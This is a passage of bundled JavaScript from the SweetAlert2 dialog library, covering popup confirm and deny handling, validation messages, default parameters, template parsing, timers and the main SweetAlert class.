          if (innerParams.preDeny) {
            instance.isAwaitingPromise = true;
            var preDenyPromise = Promise.resolve().then(function() {
              return asPromise(innerParams.preDeny(value, innerParams.validationMessage));
            });
            preDenyPromise.then(function(preDenyValue) {
              if (preDenyValue === false) {
                instance.hideLoading();
                handleAwaitingPromise(instance);
              } else {
                instance.close({
                  isDenied: true,
                  value: typeof preDenyValue === "undefined" ? value : preDenyValue
                });
              }
            })["catch"](function(error2) {
              return rejectWith(instance || _this, error2);
            });
          } else {
            instance.close({
              isDenied: true,
              value
            });
          }
        };
        var succeedWith = function succeedWith2(instance, value) {
          instance.close({
            isConfirmed: true,
            value
          });
        };
        var rejectWith = function rejectWith2(instance, error2) {
          instance.rejectPromise(error2);
        };
        var confirm = function confirm2(instance, value) {
          var innerParams = privateProps.innerParams.get(instance || _this);
          if (innerParams.showLoaderOnConfirm) {
            showLoading();
          }
          if (innerParams.preConfirm) {
            instance.resetValidationMessage();
            instance.isAwaitingPromise = true;
            var preConfirmPromise = Promise.resolve().then(function() {
              return asPromise(innerParams.preConfirm(value, innerParams.validationMessage));
            });
            preConfirmPromise.then(function(preConfirmValue) {
              if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
                instance.hideLoading();
                handleAwaitingPromise(instance);
              } else {
                succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
              }
            })["catch"](function(error2) {
              return rejectWith(instance || _this, error2);
            });
          } else {
            succeedWith(instance, value);
          }
        };
        function hideLoading() {
          var innerParams = privateProps.innerParams.get(this);
          if (!innerParams) {
            return;
          }
          var domCache = privateProps.domCache.get(this);
          hide(domCache.loader);
          if (isToast()) {
            if (innerParams.icon) {
              show(getIcon());
            }
          } else {
            showRelatedButton(domCache);
          }
          removeClass([domCache.popup, domCache.actions], swalClasses.loading);
          domCache.popup.removeAttribute("aria-busy");
          domCache.popup.removeAttribute("data-loading");
          domCache.confirmButton.disabled = false;
          domCache.denyButton.disabled = false;
          domCache.cancelButton.disabled = false;
        }
        var showRelatedButton = function showRelatedButton2(domCache) {
          var buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
          if (buttonToReplace.length) {
            show(buttonToReplace[0], "inline-block");
          } else if (allButtonsAreHidden()) {
            hide(domCache.actions);
          }
        };
        function getInput() {
          var innerParams = privateProps.innerParams.get(this);
          var domCache = privateProps.domCache.get(this);
          if (!domCache) {
            return null;
          }
          return getInput$1(domCache.popup, innerParams.input);
        }
        function setButtonsDisabled(instance, buttons, disabled) {
          var domCache = privateProps.domCache.get(instance);
          buttons.forEach(function(button) {
            domCache[button].disabled = disabled;
          });
        }
        function setInputDisabled(input, disabled) {
          var popup = getPopup();
          if (!popup || !input) {
            return;
          }
          if (input.type === "radio") {
            var radios = popup.querySelectorAll('[name="'.concat(swalClasses.radio, '"]'));
            for (var i = 0; i < radios.length; i++) {
              radios[i].disabled = disabled;
            }
          } else {
            input.disabled = disabled;
          }
        }
        function enableButtons() {
          setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
        }
        function disableButtons() {
          setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
        }
        function enableInput() {
          setInputDisabled(this.getInput(), false);
        }
        function disableInput() {
          setInputDisabled(this.getInput(), true);
        }
        function showValidationMessage(error2) {
          var domCache = privateProps.domCache.get(this);
          var params = privateProps.innerParams.get(this);
          setInnerHtml(domCache.validationMessage, error2);
          domCache.validationMessage.className = swalClasses["validation-message"];
          if (params.customClass && params.customClass.validationMessage) {
            addClass(domCache.validationMessage, params.customClass.validationMessage);
          }
          show(domCache.validationMessage);
          var input = this.getInput();
          if (input) {
            input.setAttribute("aria-invalid", "true");
            input.setAttribute("aria-describedby", swalClasses["validation-message"]);
            focusInput(input);
            addClass(input, swalClasses.inputerror);
          }
        }
        function resetValidationMessage() {
          var domCache = privateProps.domCache.get(this);
          if (domCache.validationMessage) {
            hide(domCache.validationMessage);
          }
          var input = this.getInput();
          if (input) {
            input.removeAttribute("aria-invalid");
            input.removeAttribute("aria-describedby");
            removeClass(input, swalClasses.inputerror);
          }
        }
        var defaultParams = {
          title: "",
          titleText: "",
          text: "",
          html: "",
          footer: "",
          icon: void 0,
          iconColor: void 0,
          iconHtml: void 0,
          template: void 0,
          toast: false,
          animation: true,
          showClass: {
            popup: "swal2-show",
            backdrop: "swal2-backdrop-show",
            icon: "swal2-icon-show"
          },
          hideClass: {
            popup: "swal2-hide",
            backdrop: "swal2-backdrop-hide",
            icon: "swal2-icon-hide"
          },
          customClass: {},
          target: "body",
          color: void 0,
          backdrop: true,
          heightAuto: true,
          allowOutsideClick: true,
          allowEscapeKey: true,
          allowEnterKey: true,
          stopKeydownPropagation: true,
          keydownListenerCapture: false,
          showConfirmButton: true,
          showDenyButton: false,
          showCancelButton: false,
          preConfirm: void 0,
          preDeny: void 0,
          confirmButtonText: "OK",
          confirmButtonAriaLabel: "",
          confirmButtonColor: void 0,
          denyButtonText: "No",
          denyButtonAriaLabel: "",
          denyButtonColor: void 0,
          cancelButtonText: "Cancel",
          cancelButtonAriaLabel: "",
          cancelButtonColor: void 0,
          buttonsStyling: true,
          reverseButtons: false,
          focusConfirm: true,
          focusDeny: false,
          focusCancel: false,
          returnFocus: true,
          showCloseButton: false,
          closeButtonHtml: "&times;",
          closeButtonAriaLabel: "Close this dialog",
          loaderHtml: "",
          showLoaderOnConfirm: false,
          showLoaderOnDeny: false,
          imageUrl: void 0,
          imageWidth: void 0,
          imageHeight: void 0,
          imageAlt: "",
          timer: void 0,
          timerProgressBar: false,
          width: void 0,
          padding: void 0,
          background: void 0,
          input: void 0,
          inputPlaceholder: "",
          inputLabel: "",
          inputValue: "",
          inputOptions: {},
          inputAutoFocus: true,
          inputAutoTrim: true,
          inputAttributes: {},
          inputValidator: void 0,
          returnInputValueOnDeny: false,
          validationMessage: void 0,
          grow: false,
          position: "center",
          progressSteps: [],
          currentProgressStep: void 0,
          progressStepsDistance: void 0,
          willOpen: void 0,
          didOpen: void 0,
          didRender: void 0,
          willClose: void 0,
          didClose: void 0,
          didDestroy: void 0,
          scrollbarPadding: true
        };
        var updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
        var deprecatedParams = {};
        var toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
        var isValidParameter = function isValidParameter2(paramName) {
          return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
        };
        var isUpdatableParameter = function isUpdatableParameter2(paramName) {
          return updatableParams.indexOf(paramName) !== -1;
        };
        var isDeprecatedParameter = function isDeprecatedParameter2(paramName) {
          return deprecatedParams[paramName];
        };
        var checkIfParamIsValid = function checkIfParamIsValid2(param) {
          if (!isValidParameter(param)) {
            warn('Unknown parameter "'.concat(param, '"'));
          }
        };
        var checkIfToastParamIsValid = function checkIfToastParamIsValid2(param) {
          if (toastIncompatibleParams.includes(param)) {
            warn('The parameter "'.concat(param, '" is incompatible with toasts'));
          }
        };
        var checkIfParamIsDeprecated = function checkIfParamIsDeprecated2(param) {
          var isDeprecated = isDeprecatedParameter(param);
          if (isDeprecated) {
            warnAboutDeprecation(param, isDeprecated);
          }
        };
        var showWarningsForParams = function showWarningsForParams2(params) {
          if (params.backdrop === false && params.allowOutsideClick) {
            warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
          }
          for (var param in params) {
            checkIfParamIsValid(param);
            if (params.toast) {
              checkIfToastParamIsValid(param);
            }
            checkIfParamIsDeprecated(param);
          }
        };
        function update(params) {
          var popup = getPopup();
          var innerParams = privateProps.innerParams.get(this);
          if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
            warn("You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.");
            return;
          }
          var validUpdatableParams = filterValidParams(params);
          var updatedParams = Object.assign({}, innerParams, validUpdatableParams);
          render(this, updatedParams);
          privateProps.innerParams.set(this, updatedParams);
          Object.defineProperties(this, {
            params: {
              value: Object.assign({}, this.params, params),
              writable: false,
              enumerable: true
            }
          });
        }
        var filterValidParams = function filterValidParams2(params) {
          var validUpdatableParams = {};
          Object.keys(params).forEach(function(param) {
            if (isUpdatableParameter(param)) {
              validUpdatableParams[param] = params[param];
            } else {
              warn("Invalid parameter to update: ".concat(param));
            }
          });
          return validUpdatableParams;
        };
        function _destroy() {
          var domCache = privateProps.domCache.get(this);
          var innerParams = privateProps.innerParams.get(this);
          if (!innerParams) {
            disposeWeakMaps(this);
            return;
          }
          if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
            globalState.swalCloseEventFinishedCallback();
            delete globalState.swalCloseEventFinishedCallback;
          }
          if (typeof innerParams.didDestroy === "function") {
            innerParams.didDestroy();
          }
          disposeSwal(this);
        }
        var disposeSwal = function disposeSwal2(instance) {
          disposeWeakMaps(instance);
          delete instance.params;
          delete globalState.keydownHandler;
          delete globalState.keydownTarget;
          delete globalState.currentInstance;
        };
        var disposeWeakMaps = function disposeWeakMaps2(instance) {
          if (instance.isAwaitingPromise) {
            unsetWeakMaps(privateProps, instance);
            instance.isAwaitingPromise = true;
          } else {
            unsetWeakMaps(privateMethods, instance);
            unsetWeakMaps(privateProps, instance);
            delete instance.isAwaitingPromise;
            delete instance.disableButtons;
            delete instance.enableButtons;
            delete instance.getInput;
            delete instance.disableInput;
            delete instance.enableInput;
            delete instance.hideLoading;
            delete instance.disableLoading;
            delete instance.showValidationMessage;
            delete instance.resetValidationMessage;
            delete instance.close;
            delete instance.closePopup;
            delete instance.closeModal;
            delete instance.closeToast;
            delete instance.rejectPromise;
            delete instance.update;
            delete instance._destroy;
          }
        };
        var unsetWeakMaps = function unsetWeakMaps2(obj2, instance) {
          for (var i in obj2) {
            obj2[i]["delete"](instance);
          }
        };
        var instanceMethods = /* @__PURE__ */ Object.freeze({
          __proto__: null,
          _destroy,
          close,
          closeModal: close,
          closePopup: close,
          closeToast: close,
          disableButtons,
          disableInput,
          disableLoading: hideLoading,
          enableButtons,
          enableInput,
          getInput,
          handleAwaitingPromise,
          hideLoading,
          rejectPromise,
          resetValidationMessage,
          showValidationMessage,
          update
        });
        var handlePopupClick = function handlePopupClick2(innerParams, domCache, dismissWith) {
          if (innerParams.toast) {
            handleToastClick(innerParams, domCache, dismissWith);
          } else {
            handleModalMousedown(domCache);
            handleContainerMousedown(domCache);
            handleModalClick(innerParams, domCache, dismissWith);
          }
        };
        var handleToastClick = function handleToastClick2(innerParams, domCache, dismissWith) {
          domCache.popup.onclick = function() {
            if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
              return;
            }
            dismissWith(DismissReason.close);
          };
        };
        var isAnyButtonShown = function isAnyButtonShown2(innerParams) {
          return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
        };
        var ignoreOutsideClick = false;
        var handleModalMousedown = function handleModalMousedown2(domCache) {
          domCache.popup.onmousedown = function() {
            domCache.container.onmouseup = function(e) {
              domCache.container.onmouseup = function() {
              };
              if (e.target === domCache.container) {
                ignoreOutsideClick = true;
              }
            };
          };
        };
        var handleContainerMousedown = function handleContainerMousedown2(domCache) {
          domCache.container.onmousedown = function(e) {
            if (e.target === domCache.container) {
              e.preventDefault();
            }
            domCache.popup.onmouseup = function(e2) {
              domCache.popup.onmouseup = function() {
              };
              if (e2.target === domCache.popup || e2.target instanceof HTMLElement && domCache.popup.contains(e2.target)) {
                ignoreOutsideClick = true;
              }
            };
          };
        };
        var handleModalClick = function handleModalClick2(innerParams, domCache, dismissWith) {
          domCache.container.onclick = function(e) {
            if (ignoreOutsideClick) {
              ignoreOutsideClick = false;
              return;
            }
            if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
              dismissWith(DismissReason.backdrop);
            }
          };
        };
        var isJqueryElement = function isJqueryElement2(elem) {
          return _typeof(elem) === "object" && elem.jquery;
        };
        var isElement = function isElement2(elem) {
          return elem instanceof Element || isJqueryElement(elem);
        };
        var argsToParams = function argsToParams2(args) {
          var params = {};
          if (_typeof(args[0]) === "object" && !isElement(args[0])) {
            Object.assign(params, args[0]);
          } else {
            ["title", "html", "icon"].forEach(function(name, index) {
              var arg = args[index];
              if (typeof arg === "string" || isElement(arg)) {
                params[name] = arg;
              } else if (arg !== void 0) {
                error("Unexpected type of ".concat(name, '! Expected "string" or "Element", got ').concat(_typeof(arg)));
              }
            });
          }
          return params;
        };
        function fire() {
          var Swal3 = this;
          for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
            args[_key] = arguments[_key];
          }
          return _construct(Swal3, args);
        }
        function mixin(mixinParams) {
          var MixinSwal = /* @__PURE__ */ function(_this2) {
            function MixinSwal2() {
              _classCallCheck(this, MixinSwal2);
              return _callSuper(this, MixinSwal2, arguments);
            }
            _inherits(MixinSwal2, _this2);
            return _createClass(MixinSwal2, [{
              key: "_main",
              value: function _main(params, priorityMixinParams) {
                return _get(_getPrototypeOf(MixinSwal2.prototype), "_main", this).call(this, params, Object.assign({}, mixinParams, priorityMixinParams));
              }
            }]);
          }(this);
          return MixinSwal;
        }
        var getTimerLeft = function getTimerLeft2() {
          return globalState.timeout && globalState.timeout.getTimerLeft();
        };
        var stopTimer = function stopTimer2() {
          if (globalState.timeout) {
            stopTimerProgressBar();
            return globalState.timeout.stop();
          }
        };
        var resumeTimer = function resumeTimer2() {
          if (globalState.timeout) {
            var remaining = globalState.timeout.start();
            animateTimerProgressBar(remaining);
            return remaining;
          }
        };
        var toggleTimer = function toggleTimer2() {
          var timer = globalState.timeout;
          return timer && (timer.running ? stopTimer() : resumeTimer());
        };
        var increaseTimer = function increaseTimer2(ms) {
          if (globalState.timeout) {
            var remaining = globalState.timeout.increase(ms);
            animateTimerProgressBar(remaining, true);
            return remaining;
          }
        };
        var isTimerRunning = function isTimerRunning2() {
          return !!(globalState.timeout && globalState.timeout.isRunning());
        };
        var bodyClickListenerAdded = false;
        var clickHandlers = {};
        function bindClickHandler() {
          var attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
          clickHandlers[attr] = this;
          if (!bodyClickListenerAdded) {
            document.body.addEventListener("click", bodyClickListener);
            bodyClickListenerAdded = true;
          }
        }
        var bodyClickListener = function bodyClickListener2(event) {
          for (var el = event.target; el && el !== document; el = el.parentNode) {
            for (var attr in clickHandlers) {
              var template = el.getAttribute(attr);
              if (template) {
                clickHandlers[attr].fire({
                  template
                });
                return;
              }
            }
          }
        };
        var staticMethods = /* @__PURE__ */ Object.freeze({
          __proto__: null,
          argsToParams,
          bindClickHandler,
          clickCancel,
          clickConfirm,
          clickDeny,
          enableLoading: showLoading,
          fire,
          getActions,
          getCancelButton,
          getCloseButton,
          getConfirmButton,
          getContainer,
          getDenyButton,
          getFocusableElements,
          getFooter,
          getHtmlContainer,
          getIcon,
          getIconContent,
          getImage,
          getInputLabel,
          getLoader,
          getPopup,
          getProgressSteps,
          getTimerLeft,
          getTimerProgressBar,
          getTitle,
          getValidationMessage,
          increaseTimer,
          isDeprecatedParameter,
          isLoading,
          isTimerRunning,
          isUpdatableParameter,
          isValidParameter,
          isVisible,
          mixin,
          resumeTimer,
          showLoading,
          stopTimer,
          toggleTimer
        });
        var Timer = /* @__PURE__ */ function() {
          function Timer2(callback, delay) {
            _classCallCheck(this, Timer2);
            this.callback = callback;
            this.remaining = delay;
            this.running = false;
            this.start();
          }
          return _createClass(Timer2, [{
            key: "start",
            value: function start() {
              if (!this.running) {
                this.running = true;
                this.started = /* @__PURE__ */ new Date();
                this.id = setTimeout(this.callback, this.remaining);
              }
              return this.remaining;
            }
            /**
             * @returns {number}
             */
          }, {
            key: "stop",
            value: function stop() {
              if (this.started && this.running) {
                this.running = false;
                clearTimeout(this.id);
                this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
              }
              return this.remaining;
            }
            /**
             * @param {number} n
             * @returns {number}
             */
          }, {
            key: "increase",
            value: function increase(n) {
              var running = this.running;
              if (running) {
                this.stop();
              }
              this.remaining += n;
              if (running) {
                this.start();
              }
              return this.remaining;
            }
            /**
             * @returns {number}
             */
          }, {
            key: "getTimerLeft",
            value: function getTimerLeft2() {
              if (this.running) {
                this.stop();
                this.start();
              }
              return this.remaining;
            }
            /**
             * @returns {boolean}
             */
          }, {
            key: "isRunning",
            value: function isRunning() {
              return this.running;
            }
          }]);
        }();
        var swalStringParams = ["swal-title", "swal-html", "swal-footer"];
        var getTemplateParams = function getTemplateParams2(params) {
          var template = typeof params.template === "string" ? document.querySelector(params.template) : params.template;
          if (!template) {
            return {};
          }
          var templateContent = template.content;
          showWarningsForElements(templateContent);
          var result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
          return result;
        };
        var getSwalParams = function getSwalParams2(templateContent) {
          var result = {};
          var swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
          swalParams.forEach(function(param) {
            showWarningsForAttributes(param, ["name", "value"]);
            var paramName = param.getAttribute("name");
            var value = param.getAttribute("value");
            if (typeof defaultParams[paramName] === "boolean") {
              result[paramName] = value !== "false";
            } else if (_typeof(defaultParams[paramName]) === "object") {
              result[paramName] = JSON.parse(value);
            } else {
              result[paramName] = value;
            }
          });
          return result;
        };
        var getSwalFunctionParams = function getSwalFunctionParams2(templateContent) {
          var result = {};
          var swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
          swalFunctions.forEach(function(param) {
            var paramName = param.getAttribute("name");
            var value = param.getAttribute("value");
            result[paramName] = new Function("return ".concat(value))();
          });
          return result;
        };
        var getSwalButtons = function getSwalButtons2(templateContent) {
          var result = {};
          var swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
          swalButtons.forEach(function(button) {
            showWarningsForAttributes(button, ["type", "color", "aria-label"]);
            var type = button.getAttribute("type");
            result["".concat(type, "ButtonText")] = button.innerHTML;
            result["show".concat(capitalizeFirstLetter(type), "Button")] = true;
            if (button.hasAttribute("color")) {
              result["".concat(type, "ButtonColor")] = button.getAttribute("color");
            }
            if (button.hasAttribute("aria-label")) {
              result["".concat(type, "ButtonAriaLabel")] = button.getAttribute("aria-label");
            }
          });
          return result;
        };
        var getSwalImage = function getSwalImage2(templateContent) {
          var result = {};
          var image = templateContent.querySelector("swal-image");
          if (image) {
            showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
            if (image.hasAttribute("src")) {
              result.imageUrl = image.getAttribute("src") || void 0;
            }
            if (image.hasAttribute("width")) {
              result.imageWidth = image.getAttribute("width") || void 0;
            }
            if (image.hasAttribute("height")) {
              result.imageHeight = image.getAttribute("height") || void 0;
            }
            if (image.hasAttribute("alt")) {
              result.imageAlt = image.getAttribute("alt") || void 0;
            }
          }
          return result;
        };
        var getSwalIcon = function getSwalIcon2(templateContent) {
          var result = {};
          var icon = templateContent.querySelector("swal-icon");
          if (icon) {
            showWarningsForAttributes(icon, ["type", "color"]);
            if (icon.hasAttribute("type")) {
              result.icon = icon.getAttribute("type");
            }
            if (icon.hasAttribute("color")) {
              result.iconColor = icon.getAttribute("color");
            }
            result.iconHtml = icon.innerHTML;
          }
          return result;
        };
        var getSwalInput = function getSwalInput2(templateContent) {
          var result = {};
          var input = templateContent.querySelector("swal-input");
          if (input) {
            showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
            result.input = input.getAttribute("type") || "text";
            if (input.hasAttribute("label")) {
              result.inputLabel = input.getAttribute("label");
            }
            if (input.hasAttribute("placeholder")) {
              result.inputPlaceholder = input.getAttribute("placeholder");
            }
            if (input.hasAttribute("value")) {
              result.inputValue = input.getAttribute("value");
            }
          }
          var inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
          if (inputOptions.length) {
            result.inputOptions = {};
            inputOptions.forEach(function(option) {
              showWarningsForAttributes(option, ["value"]);
              var optionValue = option.getAttribute("value");
              var optionName = option.innerHTML;
              result.inputOptions[optionValue] = optionName;
            });
          }
          return result;
        };
        var getSwalStringParams = function getSwalStringParams2(templateContent, paramNames) {
          var result = {};
          for (var i in paramNames) {
            var paramName = paramNames[i];
            var tag = templateContent.querySelector(paramName);
            if (tag) {
              showWarningsForAttributes(tag, []);
              result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
            }
          }
          return result;
        };
        var showWarningsForElements = function showWarningsForElements2(templateContent) {
          var allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
          Array.from(templateContent.children).forEach(function(el) {
            var tagName = el.tagName.toLowerCase();
            if (!allowedElements.includes(tagName)) {
              warn("Unrecognized element <".concat(tagName, ">"));
            }
          });
        };
        var showWarningsForAttributes = function showWarningsForAttributes2(el, allowedAttributes) {
          Array.from(el.attributes).forEach(function(attribute) {
            if (allowedAttributes.indexOf(attribute.name) === -1) {
              warn(['Unrecognized attribute "'.concat(attribute.name, '" on <').concat(el.tagName.toLowerCase(), ">."), "".concat(allowedAttributes.length ? "Allowed attributes are: ".concat(allowedAttributes.join(", ")) : "To set the value, use HTML within the element.")]);
            }
          });
        };
        var SHOW_CLASS_TIMEOUT = 10;
        var openPopup = function openPopup2(params) {
          var container = getContainer();
          var popup = getPopup();
          if (typeof params.willOpen === "function") {
            params.willOpen(popup);
          }
          var bodyStyles = window.getComputedStyle(document.body);
          var initialBodyOverflow = bodyStyles.overflowY;
          addClasses(container, popup, params);
          setTimeout(function() {
            setScrollingVisibility(container, popup);
          }, SHOW_CLASS_TIMEOUT);
          if (isModal()) {
            fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
            setAriaHidden();
          }
          if (!isToast() && !globalState.previousActiveElement) {
            globalState.previousActiveElement = document.activeElement;
          }
          if (typeof params.didOpen === "function") {
            setTimeout(function() {
              return params.didOpen(popup);
            });
          }
          removeClass(container, swalClasses["no-transition"]);
        };
        var swalOpenAnimationFinished = function swalOpenAnimationFinished2(event) {
          var popup = getPopup();
          if (event.target !== popup || !animationEndEvent) {
            return;
          }
          var container = getContainer();
          popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished2);
          container.style.overflowY = "auto";
        };
        var setScrollingVisibility = function setScrollingVisibility2(container, popup) {
          if (animationEndEvent && hasCssAnimation(popup)) {
            container.style.overflowY = "hidden";
            popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
          } else {
            container.style.overflowY = "auto";
          }
        };
        var fixScrollContainer = function fixScrollContainer2(container, scrollbarPadding, initialBodyOverflow) {
          iOSfix();
          if (scrollbarPadding && initialBodyOverflow !== "hidden") {
            replaceScrollbarWithPadding(initialBodyOverflow);
          }
          setTimeout(function() {
            container.scrollTop = 0;
          });
        };
        var addClasses = function addClasses2(container, popup, params) {
          addClass(container, params.showClass.backdrop);
          if (params.animation) {
            popup.style.setProperty("opacity", "0", "important");
            show(popup, "grid");
            setTimeout(function() {
              addClass(popup, params.showClass.popup);
              popup.style.removeProperty("opacity");
            }, SHOW_CLASS_TIMEOUT);
          } else {
            show(popup, "grid");
          }
          addClass([document.documentElement, document.body], swalClasses.shown);
          if (params.heightAuto && params.backdrop && !params.toast) {
            addClass([document.documentElement, document.body], swalClasses["height-auto"]);
          }
        };
        var defaultInputValidators = {
          /**
           * @param {string} string
           * @param {string} [validationMessage]
           * @returns {Promise<string | void>}
           */
          email: function email(string, validationMessage) {
            return /^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
          },
          /**
           * @param {string} string
           * @param {string} [validationMessage]
           * @returns {Promise<string | void>}
           */
          url: function url(string, validationMessage) {
            return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
          }
        };
        function setDefaultInputValidators(params) {
          if (params.inputValidator) {
            return;
          }
          if (params.input === "email") {
            params.inputValidator = defaultInputValidators["email"];
          }
          if (params.input === "url") {
            params.inputValidator = defaultInputValidators["url"];
          }
        }
        function validateCustomTargetElement(params) {
          if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
            warn('Target parameter is not valid, defaulting to "body"');
            params.target = "body";
          }
        }
        function setParameters(params) {
          setDefaultInputValidators(params);
          if (params.showLoaderOnConfirm && !params.preConfirm) {
            warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
          }
          validateCustomTargetElement(params);
          if (typeof params.title === "string") {
            params.title = params.title.split("\n").join("<br />");
          }
          init(params);
        }
        var currentInstance;
        var _promise = /* @__PURE__ */ new WeakMap();
        var SweetAlert = /* @__PURE__ */ function() {
          function SweetAlert2() {
            _classCallCheck(this, SweetAlert2);
            _classPrivateFieldInitSpec(this, _promise, void 0);
            if (typeof window === "undefined") {
              return;
            }
            currentInstance = this;
            for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
              args[_key] = arguments[_key];
            }
            var outerParams = Object.freeze(this.constructor.argsToParams(args));
            this.params = outerParams;
            this.isAwaitingPromise = false;
            _classPrivateFieldSet2(_promise, this, this._main(currentInstance.params));
          }
          return _createClass(SweetAlert2, [{
            key: "_main",
            value: function _main(userParams) {
              var mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
              showWarningsForParams(Object.assign({}, mixinParams, userParams));
              if (globalState.currentInstance) {
                var swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
                var isAwaitingPromise = globalState.currentInstance.isAwaitingPromise;
                globalState.currentInstance._destroy();
                if (!isAwaitingPromise) {
                  swalPromiseResolve({
                    isDismissed: true
                  });
                }
                if (isModal()) {
                  unsetAriaHidden();
                }
              }
              globalState.currentInstance = currentInstance;
              var innerParams = prepareParams(userParams, mixinParams);
              setParameters(innerParams);
              Object.freeze(innerParams);
              if (globalState.timeout) {
                globalState.timeout.stop();
                delete globalState.timeout;
              }
              clearTimeout(globalState.restoreFocusTimeout);
              var domCache = populateDomCache(currentInstance);
              render(currentInstance, innerParams);
              privateProps.innerParams.set(currentInstance, innerParams);
              return swalPromise(currentInstance, domCache, innerParams);
            }
            // `catch` cannot be the name of a module export, so we define our thenable methods here instead
          }, {
            key: "then",
            value: function then(onFulfilled) {
              return _classPrivateFieldGet2(_promise, this).then(onFulfilled);
            }
          }, {
            key: "finally",
            value: function _finally(onFinally) {
              return _classPrivateFieldGet2(_promise, this)["finally"](onFinally);
            }
          }]);
        }();
        var swalPromise = function swalPromise2(instance, domCache, innerParams) {
          return new Promise(function(resolve, reject) {
            var dismissWith = function dismissWith2(dismiss) {
              instance.close({
                isDismissed: true,
                dismiss
              });
            };
            privateMethods.swalPromiseResolve.set(instance, resolve);
            privateMethods.swalPromiseReject.set(instance, reject);
            domCache.confirmButton.onclick = function() {
              handleConfirmButtonClick(instance);
            };
            domCache.denyButton.onclick = function() {
              handleDenyButtonClick(instance);
            };
            domCache.cancelButton.onclick = function() {
              handleCancelButtonClick(instance, dismissWith);
            };
            domCache.closeButton.onclick = function() {
              dismissWith(DismissReason.close);
            };
            handlePopupClick(innerParams, domCache, dismissWith);
            addKeydownHandler(globalState, innerParams, dismissWith);
            handleInputOptionsAndValue(instance, innerParams);
            openPopup(innerParams);
            setupTimer(globalState, innerParams, dismissWith);
            initFocus(domCache, innerParams);
            setTimeout(function() {
              domCache.container.scrollTop = 0;
            });
          });
        };
        var prepareParams = function prepareParams2(userParams, mixinParams) {
          var templateParams = getTemplateParams(userParams);
          var params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
          params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
          params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
          if (params.animation === false) {
            params.showClass = {
              backdrop: "swal2-noanimation"
            };
            params.hideClass = {};
          }
          return params;
        };
        var populateDomCache = function populateDomCache2(instance) {
          var domCache = {
            popup: getPopup(),
            container: getContainer(),
            actions: getActions(),
            confirmButton: getConfirmButton(),
            denyButton: getDenyButton(),
            cancelButton: getCancelButton(),
            loader: getLoader(),
            closeButton: getCloseButton(),
            validationMessage: getValidationMessage(),
            progressSteps: getProgressSteps()
          };
          privateProps.domCache.set(instance, domCache);
          return domCache;
        };
        var setupTimer = function setupTimer2(globalState2, innerParams, dismissWith) {
          var timerProgressBar = getTimerProgressBar();
          hide(timerProgressBar);
          if (innerParams.timer) {
            globalState2.timeout = new Timer(function() {
              dismissWith("timer");
              delete globalState2.timeout;
            }, innerParams.timer);
            if (innerParams.timerProgressBar) {
              show(timerProgressBar);
              applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
              setTimeout(function() {
                if (globalState2.timeout && globalState2.timeout.running) {
